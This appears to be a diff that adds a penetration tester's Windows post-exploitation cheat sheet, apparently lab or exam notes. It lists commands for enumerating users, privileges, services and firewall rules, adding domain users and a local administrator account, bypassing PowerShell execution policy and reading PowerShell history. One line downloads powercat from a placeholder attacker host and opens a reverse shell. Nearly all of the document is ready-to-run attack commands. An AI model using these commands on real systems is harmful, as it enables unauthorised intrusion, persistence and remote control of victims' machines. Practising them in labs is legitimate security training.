@@ -1,0 +1,77 @@
+World writable directories
+c:\windows\temp
+c:\windows\tasks
+c:\users\public\documents
+As soon as I have a foot hold
+locate flags
+Get-ChildItem -Recurse -Path C:\ -Filter local.txt
+Get-ChildItem -Recurse -Path C:\ -Filter proof.txt
+enumerate for pivot or priv esc
+whoami
+whoami /priv
+wmic service get name,startname
+net start
+ipconfig
+systeminfo
+
+(what am i connected to?)
+netstat -anoy
+
+(user and group names)
+net users
+net localgroup
+net user <username>
+net localgroup administrators
+net group "group name" stephanie /add /domain
+net group "group name" stephanie /del /domain
+net user jen Password123 /domain
+
+runas /user:corp\jen powershell.exe
+
+(firewall rules)
+netsh advfirewall firewall show rule name=all
+netsh advfirewall firewall show rule name=inbound
+netsh advfirewall firewall show fule name=outbound
+
+(file transfer capability)
+certutil
+ftp
+tftp
+vb
+ps
+smb
+nfs
+
+(any scheduled tasks i/o operations?)
+C:\ > schtasks /query /fo LIST /v > schtasks.txt
+
+(binpaths?)
+sc.exe
+
+(found a folder?)
+dir /a /o /q
+* maybe something is running as NT SYSTEM/AUTHORITY that you can use.
+
+(powershell and want to run a script? start with:)
+powershell -ep bypass 
+locate files and texts in powershell:
+(PS) Get-ChildItem -Recurse -Path C:\ -Filter *filename* | Where-Object {$_.Name -like "*search_term*"}
+get the whole directory listing into a file
+(batch) dir /b /s /a:-D > results.txt
+(batch) findstr /spin /c:"string" "c:\pass*.txt"
+adding users:
+(PS) New-LocalUser -AccountNeverExpires:$true -Password ( ConvertTo-SecureString -AsPlainText -Force 'testtest') -Name $a -FullName "admin" -Description "Local Administrator" | Add-LocalGroupMember -Group administrators
+net user ($User.Name) /logonpasswordchg:yes
+change file name:
+(PS) Rename-Item -Path -NewName
+using "sc" to run other files (example)
+cmd /c sc qc autoTracker
+cmd /c sc start autoTracker
+Domain Shares
+ls \\dc1.here.com\sysvol\here.com\
+shell stabilizer
+IEX(New-Object System.Net.WebClient).DownloadString('http://${ATTACKER_IP}:${ATTACKER_HTTP_PORT}/powercat.ps1'); powercat -c ${ATTACKER_IP} -p ${ATTACKER_PORT} -e powershell
+Where is Powershell History located?
+(get-psreadlineoption).historysavepath
+
+type C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
